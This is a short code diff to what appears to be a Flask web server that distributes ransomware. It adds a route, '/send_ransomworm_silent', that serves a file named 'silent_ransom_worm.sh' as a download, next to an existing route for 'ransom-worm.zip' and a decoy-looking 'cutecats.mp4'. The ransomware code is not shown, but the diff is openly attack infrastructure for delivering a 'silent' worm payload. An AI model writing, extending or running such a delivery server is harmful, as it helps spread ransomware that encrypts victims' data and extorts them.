@@ -17,6 +17,7 @@ FILE_TO_SERVE = "./instructions.txt"
 SECRET_KEY = "./private.pem"
 VIDEO = './cutecats.mp4'
 RANSOM_WORM = './ransom-worm.zip'
+SILENT_RANSOM_WORM = './silent_ransom_worm.sh'
 
 ###########################################################################################################################
 #####################################################     PROGRAM     #####################################################
@@ -57,6 +58,10 @@ if __name__ == '__main__':
     @app.route('/send_ransomworm')
     def send_ransomworm():
         return send_file(RANSOM_WORM, as_attachment=True)
+
+    @app.route('/send_ransomworm_silent')
+    def send_ransomworm_silent():
+        return send_file(SILENT_RANSOM_WORM, as_attachment=True)
 
     if __name__ == '__main__':
         app.run(host=IP_ADDRESS, port=PORT, debug=True)
